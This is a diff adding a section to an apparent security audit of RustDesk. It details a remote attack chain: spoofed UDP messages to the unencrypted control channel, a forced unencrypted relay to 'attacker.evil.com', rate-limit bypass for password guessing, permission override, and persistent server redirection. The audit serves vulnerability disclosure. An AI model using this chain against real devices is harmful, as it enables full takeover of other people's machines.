@@ -2671,3 +2671,366 @@ Impact: MEDIUM — one phished code → permanent 2FA bypass
 | N (2FA Persistence) | Yes (once) | Yes (once) | Network (any) |
 
 Chains I and J are the most critical: they require only local access to any user account and achieve full RustDesk access (including root shell on Linux) without knowing any password or 2FA code.
+
+---
+
+# Part VIII: Pure Remote Exploitation — RS Control Channel Injection
+
+## The Critical Discovery
+
+**The RS-to-device control channel uses UNENCRYPTED UDP by default.** This is the foundation for a complete pure-remote exploitation chain requiring ZERO local access, ZERO MITM position, ZERO phishing, and ZERO prior compromise.
+
+## FINDING 29 (CRITICAL): Unencrypted RS-Device UDP Control Channel
+
+**File:** `src/rendezvous_mediator.rs:399-410, 156-265`
+**Impact:** Any attacker who can spoof UDP packets can inject arbitrary control messages to any RustDesk device
+**Type:** CWE-319 (Cleartext Transmission of Sensitive Information)
+
+### The Default Path Selection
+
+```rust
+// rendezvous_mediator.rs:399-410
+pub async fn start(server: ServerPtr, host: String) -> ResultType<()> {
+    if (cfg!(debug_assertions) && option_env!("TEST_TCP").is_some())
+        || Config::is_proxy()
+        || use_ws()
+        || crate::is_udp_disabled()
+    {
+        Self::start_tcp(server, host).await   // ← ENCRYPTED (secure_tcp at line 346)
+    } else {
+        Self::start_udp(server, host).await   // ← DEFAULT: UNENCRYPTED
+    }
+}
+```
+
+**By DEFAULT in production builds**, the device connects to the RS over plain UDP:
+- `start_tcp` (line 341-346): calls `secure_tcp(&mut conn, &key)` → **encrypted**
+- `start_udp` (line 156-265): sends/receives raw protobuf over UDP → **NO encryption**
+
+Both paths process the same `handle_resp` function (line 269), which handles ALL control messages including `ConfigureUpdate`, `PunchHole`, `RequestRelay`, and `FetchLocalAddr`.
+
+### UDP "Connection" Verification
+
+```rust
+// line 159
+let (mut socket, mut addr) = new_udp_for(&host, CONNECT_TIMEOUT).await?;
+```
+
+The UDP socket is "connected" to the RS address — meaning `recv()` only accepts packets from the RS's IP:port. But this is **NOT cryptographic authentication**. Any attacker who can send UDP packets with the RS's source IP:port will have their messages accepted.
+
+## FINDING 30 (CRITICAL): Injected RequestRelay → Forced Unencrypted Connection to Attacker
+
+**Files:** `src/rendezvous_mediator.rs:311-316, 413-432`, `src/server.rs:310-332`
+**Impact:** Attacker forces target device to establish unencrypted TCP connection to attacker-controlled server
+**Type:** CWE-940 (Improper Verification of Source of a Communication Channel)
+
+### The RequestRelay Handler
+
+When the device receives a `RequestRelay` message (line 311-316, via UDP from "RS"):
+
+```rust
+// rendezvous_mediator.rs:413-432
+async fn handle_request_relay(&self, rr: RequestRelay, server: ServerPtr) -> ResultType<()> {
+    self.create_relay(
+        rr.socket_addr.into(),     // ← ATTACKER-CONTROLLED peer address
+        rr.relay_server,           // ← ATTACKER-CONTROLLED relay server
+        rr.uuid,                   // ← ATTACKER-CONTROLLED UUID
+        server,
+        rr.secure,                 // ← ATTACKER-CONTROLLED: false = NO ENCRYPTION
+        false,
+        Default::default(),
+        rr.control_permissions.clone().into_option(),  // ← ATTACKER-CONTROLLED permissions
+    )
+    .await
+}
+```
+
+**Every field is attacker-controlled** when the message is injected via UDP spoofing.
+
+### The Relay Connection Chain
+
+```rust
+// server.rs:310-332 (create_relay_connection_)
+let mut stream = socket_client::connect_tcp(relay_server, CONNECT_TIMEOUT).await?;
+// Target connects to ATTACKER'S relay server
+
+let mut msg_out = RendezvousMessage::new();
+msg_out.set_request_relay(RequestRelay {
+    licence_key,  // RS public key sent to attacker — not secret but confirms target identity
+    uuid,
+    ..Default::default()
+});
+stream.send(&msg_out).await?;
+
+// Then:
+create_tcp_connection(server, stream, peer_addr, secure, control_permissions).await?;
+//                                     ^^^^^^^^  ^^^^^^  ^^^^^^^^^^^^^^^^^^^
+//                                     FAKE ADDR  false   ATTACKER PERMISSIONS
+```
+
+When `secure = false` (line 195 of server.rs):
+```rust
+if secure && pk.len() == sign::PUBLICKEYBYTES && sk.len() == sign::SECRETKEYBYTES {
+    // DH key exchange — SKIPPED when secure=false
+}
+// Falls through to Connection::start with NO encryption
+```
+
+**Result: Target establishes a direct, unencrypted TCP connection to the attacker's relay server.**
+
+## FINDING 31 (CRITICAL): Rate Limit Bypass via Attacker-Controlled IP
+
+**Files:** `src/server/connection.rs:1228, 3412-3461`
+**Impact:** Unlimited password attempts — rate limiting completely neutralized
+**Type:** CWE-799 (Improper Control of Interaction Frequency)
+
+### The Rate Limit Uses Attacker-Controlled IP
+
+```rust
+// connection.rs:1228 (in on_open)
+self.ip = addr.ip().to_string();  // addr comes from create_tcp_connection's peer_addr
+
+// connection.rs:3412-3461 (check_failure)
+let ip = self.ip.clone();  // Uses the attacker-controlled IP for rate limiting
+```
+
+The `addr` parameter for relay connections comes from:
+```
+RequestRelay.socket_addr → AddrMangle::decode → peer_addr → addr → self.ip
+```
+
+**`socket_addr` in RequestRelay is entirely attacker-controlled.** Each injected RequestRelay can specify a DIFFERENT fake address, giving each resulting connection a unique IP in the rate limiter.
+
+### Rate Limit Neutralization
+
+Normal rate limit: **6 attempts/minute/IP, 30 total/IP** (in-memory)
+
+With UDP injection:
+- Each injected RequestRelay creates a new connection with a unique fake IP
+- Rate limiter sees each connection as a different "attacker"
+- **Unlimited password attempts at any speed**
+
+## FINDING 32 (HIGH): Attacker-Controlled Permission Override
+
+**Files:** `src/rendezvous_mediator.rs:430`, `src/server/connection.rs:1981-2009`
+**Impact:** Attacker enables all device capabilities regardless of local settings
+**Type:** CWE-863 (Incorrect Authorization)
+
+### The Permission Override Chain
+
+The `control_permissions` field in RequestRelay is passed through the entire chain:
+
+```
+RequestRelay.control_permissions
+  → create_relay(control_permissions)
+    → create_relay_connection_(control_permissions)
+      → create_tcp_connection(control_permissions)
+        → Connection::start(control_permissions)
+          → Connection { control_permissions } stored in connection state
+```
+
+When permissions are checked (line 1981-2009):
+```rust
+fn permission(enable_prefix_option: &str, control_permissions: &Option<ControlPermissions>) -> bool {
+    if let Some(control_permissions) = control_permissions {
+        // RS-provided permissions OVERRIDE local settings
+        if let Some(enabled) = get_control_permission(...) {
+            return enabled;  // ← Attacker's value used, local config IGNORED
+        }
+    }
+    Self::is_permission_enabled_locally(enable_prefix_option)  // ← Only reached if RS didn't set it
+}
+```
+
+Even if the device owner has disabled terminal access, file transfer, etc. — the attacker's injected `control_permissions` with all features enabled takes priority.
+
+## FINDING 33 (HIGH): ConfigureUpdate RS Redirect via UDP Injection
+
+**File:** `src/rendezvous_mediator.rs:325-334`
+**Impact:** Attacker redirects device's RS connection to rogue server, persists across restarts
+**Type:** CWE-494 (Download of Code Without Integrity Check)
+
+```rust
+// rendezvous_mediator.rs:325-334
+Some(rendezvous_message::Union::ConfigureUpdate(cu)) => {
+    let v0 = Config::get_rendezvous_servers();
+    Config::set_option(
+        "rendezvous-servers".to_owned(),
+        cu.rendezvous_servers.join(","),  // ← Written to PERSISTENT config
+    );
+    Config::set_serial(cu.serial);
+    if v0 != Config::get_rendezvous_servers() {
+        Self::restart();  // ← RS connection restarts with new (attacker) servers
+    }
+}
+```
+
+The attacker injects `ConfigureUpdate` via UDP → device's RS config is PERMANENTLY changed → written to disk → survives reboots. The device now connects to the attacker's RS for ALL future operations.
+
+After restart, the device reconnects via UDP (default) to the attacker's RS. The attacker's RS now:
+- Receives the device's RegisterPk (learns ID and public key)
+- Controls all PunchHole routing for this device
+- Can respond to PunchHoleRequests with arbitrary addresses
+- Can inject further RequestRelay messages
+
+---
+
+## COMPLETE PURE-REMOTE ATTACK CHAIN
+
+**Requirements:**
+- Internet access to the public RS (to enumerate IDs)
+- Ability to send UDP packets with spoofed source IP (~25% of internet networks)
+- Target device uses a weak/dictionary password (not random temporary)
+
+**NO local access. NO MITM. NO phishing. NO prior compromise.**
+
+```
+PHASE 1: Target Discovery (minutes)
+├─ Send PunchHoleRequest to public RS for random 9-digit IDs
+├─ RS returns: ID_NOT_EXIST (skip) vs OFFLINE (real) vs Success (online + IP)
+├─ For online devices: PunchHoleResponse contains target's public IP:port
+└─ Result: target_id, target_ip, target_udp_port
+
+PHASE 2: RS Control Channel Injection (milliseconds)
+├─ Craft UDP packet:
+│   ├─ Source IP: RS_public_IP (known: e.g., hbbs.rustdesk.com)
+│   ├─ Source port: RS_PORT (21116)
+│   ├─ Dest: target_ip:target_udp_port (from Phase 1)
+│   └─ Payload: protobuf RequestRelay {
+│       relay_server: "attacker.evil.com:21117",
+│       uuid: "attacker-controlled-uuid",
+│       secure: false,              ← NO ENCRYPTION
+│       socket_addr: fake_addr_1,   ← UNIQUE per attempt (rate limit bypass)
+│       control_permissions: {      ← ALL permissions enabled
+│           keyboard: true, clipboard: true, file: true,
+│           terminal: true, tunnel: true, ...
+│       }
+│   }
+├─ Target receives spoofed UDP, thinks it's from RS
+├─ Target calls handle_request_relay → create_relay → create_relay_connection_
+├─ Target connects to attacker.evil.com:21117 via TCP (UNENCRYPTED)
+└─ Result: Direct unencrypted TCP channel between target and attacker
+
+PHASE 3: Password Attack (hours for dictionary, unlimited speed)
+├─ Attacker's relay pairs target with attacker's "client"
+├─ Target sends Hash{salt, challenge} in PLAINTEXT
+├─ Attacker computes SHA256(SHA256(guess + salt) + challenge)
+├─ Sends LoginRequest with password hash
+│
+├─ If WRONG:
+│   ├─ Inject NEW RequestRelay via UDP with different socket_addr
+│   ├─ New connection → new self.ip → rate limit reset
+│   ├─ Effectively: UNLIMITED attempts per second
+│   └─ Repeat with next password from dictionary
+│
+├─ If RIGHT:
+│   ├─ validate_password() returns true
+│   ├─ send_logon_response() → authorized = true
+│   └─ FULL ACCESS GRANTED
+│
+└─ Attack speed:
+    ├─ No rate limit (each attempt uses unique fake IP)
+    ├─ Limited only by UDP injection speed + TCP connection setup
+    ├─ ~10-100 attempts/second realistic
+    ├─ 100K password dictionary → 17 minutes to 2.8 hours
+    └─ RockYou top 10K passwords → 1.7 minutes to 17 minutes
+
+PHASE 4: Post-Authentication (immediate)
+├─ All permissions enabled via control_permissions override
+│   (even if device owner disabled terminal, file transfer, etc.)
+├─ Screen capture: view/record target screen
+├─ Keyboard/mouse: full remote control
+├─ File transfer: read/write any file (running as service user)
+├─ Terminal: root shell on Linux, SYSTEM shell on Windows
+│   └─ terminal_service.rs:841-882 — PTY as service user, NO command filtering
+├─ Port forwarding: pivot into internal network
+└─ Connection is UNENCRYPTED — attacker sees everything in plaintext
+```
+
+## Why This Is Different From Simple Brute-Force
+
+Previous findings (Parts V-VI) described password brute-force through the normal RS-mediated path:
+- Rate limited: 6/min/IP
+- Encrypted: can't see Hash
+- Normal connection path
+
+**This chain is fundamentally different:**
+
+| Aspect | Normal Path | UDP Injection Chain |
+|---|---|---|
+| Connection path | RS-mediated | Forced relay to attacker |
+| Encryption | Yes (secure=true) | **None (secure=false)** |
+| Rate limiting | 6/min/IP, 30 total | **ZERO — unlimited** |
+| Permissions | Local settings | **Attacker override — all enabled** |
+| Attack speed | ~6 passwords/minute | **~10-100 passwords/second** |
+| 100K dictionary | ~11.5 days | **~17 minutes** |
+| Prerequisites | RS connection only | UDP spoofing capability |
+
+## Practical Assessment
+
+**What makes this work:**
+- RS-device UDP channel is unencrypted by DEFAULT (Finding 29) — this is the root cause
+- ALL RequestRelay fields are trusted without verification (Finding 30)
+- Rate limit uses attacker-controlled address (Finding 31)
+- Permission override via control_permissions (Finding 32)
+- ~25% of internet networks allow UDP source spoofing (studies: Beverly 2005, Lone 2017)
+
+**What limits it:**
+- UDP spoofing IS filtered on some networks (BCP 38/84 compliant ISPs)
+- Devices using RustDesk's default random temporary passwords resist dictionary attacks
+- Custom RS deployments using `is_udp_disabled()` or WebSocket mode use encrypted TCP
+- The RS IP:port must be known (trivial for the public RS, discoverable for custom RS)
+
+**Against vulnerable targets (weak password + unfiltered network):**
+- This chain achieves COMPLETE REMOTE ACCESS from zero
+- No local access, no MITM, no phishing, no prior compromise
+- The device is fully controlled: screen, keyboard, files, root/SYSTEM shell
+- All local permission restrictions are bypassed
+
+## Additional Pure-Remote Vector: ConfigureUpdate Persistence
+
+Even without cracking the password, the attacker can permanently degrade the device's security:
+
+```
+1. Inject ConfigureUpdate via UDP:
+   rendezvous_servers: ["attacker.evil.com"]
+   serial: 99999999
+
+2. Device writes new RS to persistent config
+3. Device restarts RS connection → connects to attacker's RS
+
+4. Attacker's rogue RS now controls:
+   ├─ PunchHole routing → redirect connections
+   ├─ Relay selection → force attacker-controlled relays
+   ├─ RegisterPk responses → could return UUID_MISMATCH to force ID change
+   └─ ConfigureUpdate → maintain persistence
+
+5. All future peer connections are mediated by attacker
+6. Attacker can selectively downgrade encryption (empty signed_id_pk)
+7. PERSISTS across reboots (written to Config file)
+```
+
+---
+
+## Cumulative Findings Summary (Parts I-VIII)
+
+| # | Finding | Severity | Access Required | Password Needed |
+|---|---|---|---|---|
+| 1-12 | Parts I-II (IPC, crypto, config) | Various | Local | Various |
+| 13-14 | Protocol downgrade, SyncConfig | High | Network/Local | No |
+| 15-18 | Direct server, SSRF, LAN leak, brute-force | Various | Network | Various |
+| 19-20 | ID enumeration, stable salt | High/Medium | Remote | No |
+| 21-22 | **SwitchSides bypass, RS PK injection** | **CRITICAL** | Local | **NO** |
+| 23-28 | Protocol chains, SSRF, rate-limit | Various | Various | Various |
+| 29-33 | **RS UDP injection chain** | **CRITICAL** | **Remote (UDP spoof)** | **Dictionary** |
+
+### The Three Attack Tiers (Revised)
+
+**Tier 1 — Pure Remote (UDP spoof capable):**
+Findings 29-33. Inject into unencrypted RS-device channel → force unencrypted relay → unlimited rate password attack with permission override. Full access against weak passwords.
+
+**Tier 2 — Local (any user):**
+Findings 21-22. IPC → SwitchSides UUID theft → full access without ANY password or 2FA. Or IPC → RS key/server replacement → MITM all future connections.
+
+**Tier 3 — Network MITM:**
+Findings 23, 26. Protocol downgrade → SwitchSides UUID theft → passwordless access. Or relay token race → session hijack.
